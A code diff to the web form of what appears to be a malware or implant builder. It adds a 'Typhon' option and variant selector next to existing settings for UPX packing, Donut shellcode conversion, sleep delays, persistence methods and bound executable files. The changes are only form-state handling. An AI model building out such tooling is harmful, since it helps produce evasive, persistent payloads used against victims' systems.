@@ -104,6 +104,8 @@ function saveFormSettings() {
       enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
       upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
       enableDonut: document.querySelector('input[name="enable-donut"]')?.checked ?? false,
+      enableTyphon: document.querySelector('input[name="enable-typhon"]')?.checked ?? false,
+      typhonVariant: document.getElementById("typhon-variant")?.value ?? "1",
       sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
       enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
       persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
@@ -153,6 +155,8 @@ function restoreFormSettings() {
     if (s.enableUpx !== undefined) setCb('input[name="enable-upx"]', s.enableUpx);
     if (s.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', s.upxStripHeaders);
     if (s.enableDonut !== undefined) setCb('input[name="enable-donut"]', s.enableDonut);
+    if (s.enableTyphon !== undefined) setCb('input[name="enable-typhon"]', s.enableTyphon);
+    if (s.typhonVariant !== undefined) setVal("typhon-variant", s.typhonVariant);
     if (s.sleepSeconds !== undefined) setVal("sleep-seconds", s.sleepSeconds);
     if (s.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', s.enablePersistence);
     if (Array.isArray(s.persistenceMethods)) {
@@ -179,6 +183,11 @@ function restoreFormSettings() {
     const upxContainer = document.getElementById("upx-settings-container");
     if (restoredUpx && upxContainer) {
       upxContainer.classList.toggle("hidden", !restoredUpx.checked);
+    }
+    const restoredTyphon = document.querySelector('input[name="enable-typhon"]');
+    const typhonContainer = document.getElementById("typhon-settings-container");
+    if (restoredTyphon && typhonContainer) {
+      typhonContainer.classList.toggle("hidden", !restoredTyphon.checked);
     }
   } catch (err) {
     console.error("Failed to restore form settings:", err);
@@ -295,6 +304,23 @@ if (upxCheckbox && upxSettingsContainer) {
       upxSettingsContainer.classList.remove("hidden");
     } else {
       upxSettingsContainer.classList.add("hidden");
+    }
+  });
+}
+
+const typhonCheckbox = document.querySelector('input[name="enable-typhon"]');
+const typhonSettingsContainer = document.getElementById("typhon-settings-container");
+if (typhonCheckbox && typhonSettingsContainer) {
+  typhonCheckbox.addEventListener("change", () => {
+    if (typhonCheckbox.checked) {
+      typhonSettingsContainer.classList.remove("hidden");
+      // Auto-enable Donut when Typhon is selected (Typhon needs shellcode)
+      const donutCb = document.querySelector('input[name="enable-donut"]');
+      if (donutCb && !donutCb.checked) {
+        donutCb.checked = true;
+      }
+    } else {
+      typhonSettingsContainer.classList.add("hidden");
     }
   });
 }
@@ -622,6 +648,8 @@ form?.addEventListener("submit", async (e) => {
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
     enableDonut: form.querySelector('input[name="enable-donut"]')?.checked || false,
+    enableTyphon: form.querySelector('input[name="enable-typhon"]')?.checked || false,
+    typhonVariant: document.getElementById("typhon-variant")?.value || "1",
     boundFiles: boundFiles.length > 0
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
